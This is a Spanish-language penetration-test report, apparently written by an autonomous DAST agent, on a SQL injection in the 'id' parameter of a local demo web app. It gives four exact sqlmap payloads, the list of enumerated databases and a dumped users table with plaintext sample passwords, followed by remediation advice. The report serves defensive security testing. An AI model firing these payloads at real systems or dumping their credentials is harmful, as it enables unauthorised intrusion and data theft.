# Informe de Seguridad: SQL Injection — http://web.dev.local:8083

**Fecha:** 2026-04-25T12:03:14Z  
**Herramienta:** sqlmap 1.9.10  
**Analista:** Agente Autónomo DAST  
**Objetivo:** http://web.dev.local:8083  

---

## 1. Resumen Ejecutivo

Se realizó un análisis DAST orientado a la detección de vulnerabilidades de tipo SQL Injection (SQLi) sobre la aplicación web disponible en `http://web.dev.local:8083`. Se identificó un vector de inyección activo en el parámetro `id` del formulario de búsqueda de usuarios (método GET). La vulnerabilidad fue confirmada y explotada con éxito, logrando la extracción completa de la tabla de usuarios de la base de datos, incluyendo credenciales en texto plano.

**Severidad: CRÍTICA**

---

## 2. Vectores Analizados

| Vector | Método | Parámetro | Resultado |
|--------|--------|-----------|-----------|
| `/?id=1&Submit=Submit` | GET | `id` | **VULNERABLE** |

### Reconocimiento

La página principal presenta un formulario HTML con un campo `User ID` (parámetro `id`) que realiza una consulta GET hacia el mismo endpoint. Al enviar el valor `1`, la aplicación devuelve:

```
ID: 1
First name: John
Surname: Doe
```

La respuesta directa de datos de base de datos indica que el parámetro se usa en una consulta SQL sin sanitización adecuada.

---

## 3. Hallazgos

### Vulnerabilidad: SQL Injection en parámetro `id`

- **URL vulnerable:** `http://web.dev.local:8083/?id=1&Submit=Submit`
- **Parámetro:** `id` (GET)
- **DBMS:** MySQL 5 (MariaDB fork)
- **SO servidor:** Linux Debian
- **Tecnologías:** PHP 8.1.33, Apache 2.4.65
- **Usuario DB:** `root@%` (privilegios máximos)

#### Tipos de inyección detectados

| Tipo | Técnica | Título |
|------|---------|--------|
| Boolean-based blind | WHERE clause (subquery + comment) | AND boolean-based blind |
| Error-based | FLOOR() en WHERE/HAVING | MySQL >= 5.0 OR error-based |
| Time-based blind | SLEEP() | MySQL >= 5.0.12 time-based blind |
| UNION query | NULL - 2 columnas | Generic UNION query |

#### Payloads exactos de sqlmap

**Boolean-based blind:**
```
id=5029' AND 6551=(SELECT (CASE WHEN (6551=6551) THEN 6551 ELSE (SELECT 2428 UNION SELECT 1249) END))-- -&Submit=Submit
```

**Error-based:**
```
id=5029' OR (SELECT 8777 FROM(SELECT COUNT(*),CONCAT(0x71717a6a71,(SELECT (ELT(8777=8777,1))),0x717a716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- mTmP&Submit=Submit
```

**Time-based blind:**
```
id=5029' AND (SELECT 7778 FROM (SELECT(SLEEP(5)))JVzb)-- YZiE&Submit=Submit
```

**UNION query:**
```
id=5029' UNION ALL SELECT NULL,CONCAT(0x71717a6a71,0x7266786d565148786279414c49575057486e62576c7a784d474c536d514662424c6c7042556d474b,0x717a716a71)-- -&Submit=Submit
```

---

## 4. Evidencia de Explotación

### Bases de datos enumeradas (usuario `root@%`)

```
[*] information_schema
[*] mysql
[*] performance_schema
[*] sqli_demo
[*] sys
```

### Tabla extraída: `sqli_demo.users`

```
+---------+---------------------+-------------+-----------+-----------+------------+
| user_id | email               | password    | username  | last_name | first_name |
+---------+---------------------+-------------+-----------+-----------+------------+
| 1       | admin@example.com   | password123 | admin     | Doe       | John       |
| 2       | jane@example.com    | secret456   | jsmith    | Smith     | Jane       |
| 3       | bob@example.com     | mypass789   | bjohnson  | Johnson   | Bob        |
| 4       | alice@example.com   | qwerty123   | awilliams | Williams  | Alice      |
| 5       | charlie@example.com | password    | cbrown    | Brown     | Charlie    |
| 6       | diana@example.com   | secure123   | ddavis    | Davis     | Diana      |
| 7       | eve@example.com     | hackme      | emiller   | Miller    | Eve        |
| 8       | frank@example.com   | admin123    | fwilson   | Wilson    | Frank      |
+---------+---------------------+-------------+-----------+-----------+------------+
```

**Hallazgo crítico:** Las contraseñas están almacenadas en **texto plano** (sin hash), lo que agrava significativamente el impacto.

---

## 5. Impacto

- **Confidencialidad:** CRÍTICO — Exposición total de credenciales de 8 usuarios incluyendo el administrador.
- **Integridad:** ALTO — El usuario de base de datos es `root@%`, lo que permite modificar o eliminar cualquier dato.
- **Disponibilidad:** ALTO — Posibilidad de ejecutar operaciones destructivas (`DROP`, `DELETE`).
- **Escalada:** El acceso como `root` a MySQL podría permitir leer archivos del sistema o escribir webshells según la configuración.

---

## 6. Recomendaciones

1. **Usar consultas parametrizadas / prepared statements** en lugar de concatenación directa de SQL.
2. **Hashear contraseñas** con algoritmos robustos (bcrypt, Argon2).
3. **Principio de mínimo privilegio:** la aplicación no debe conectarse a la BD como `root`.
4. **Implementar WAF** para detección y bloqueo de patrones SQLi.
5. **Validar y sanitizar** todas las entradas de usuario en el lado del servidor.

---

## 7. Conclusión

La aplicación web en `http://web.dev.local:8083` presenta una vulnerabilidad crítica de SQL Injection en el parámetro `id`. La explotación resultó en la extracción completa de la base de datos `sqli_demo`, incluyendo credenciales de todos los usuarios en texto plano. El vector es trivialmente explotable y representa un riesgo inmediato para la confidencialidad e integridad del sistema.

**Estado:** EXPLOTADO CON ÉXITO ✅
